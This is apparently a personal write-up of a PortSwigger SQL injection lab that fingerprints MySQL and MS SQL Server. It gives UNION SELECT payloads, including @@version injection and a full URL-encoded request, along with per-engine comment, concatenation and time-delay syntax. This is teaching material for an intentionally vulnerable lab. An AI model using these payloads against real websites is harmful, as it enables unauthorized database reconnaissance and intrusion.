# Lab 08 — SQL injection attack, querying the database type and version on MySQL and Microsoft

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Examining the database |
| **Concept** | [08 — Examining the database](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft |

---

## 🎯 Objective
Display the **database version string**. This lab runs on **MySQL / Microsoft SQL Server**.

## 🧠 Background
Both MySQL and MS SQL Server expose the version via `@@version`. The MySQL twist: the `--` comment needs a trailing space, so it's easier to use the **`#`** comment (URL-encoded `%23`).

## 🪜 Methodology
1. Determine column count = **2**, both text:
   ```
   ?category=Gifts' UNION SELECT NULL,NULL#
   ?category=Gifts' UNION SELECT 'a','b'#
   ```
2. Retrieve `@@version`:
   ```
   ?category=Gifts' UNION SELECT @@version, NULL#
   ```

## 💥 Payload
URL-encoded (`#` → `%23`):
```
https://LAB-ID.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+@@version,+NULL%23
```
If the engine were MS SQL, `--` works fine too:
```
?category=Gifts'+UNION+SELECT+@@version,+NULL--
```

## ✅ Why it works
`@@version` is a global variable on both engines returning the product/version banner. Rendered into a text column, it confirms the DBMS. The `#` (MySQL) comment discards the remainder of the original query.

## 🧭 MySQL vs MS SQL tells
| | MySQL | MS SQL |
|---|---|---|
| Comment | `#` or `-- ` (space) | `--` |
| Concat | `CONCAT(a,b)` | `a + b` |
| Delay | `SLEEP()` | `WAITFOR DELAY` |

## 🛡️ Remediation
See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
`@@version` fingerprints MySQL/MSSQL; remember MySQL's `--` needs a space (use `#`). `#sqli` `#practitioner` `#mysql` `#mssql`
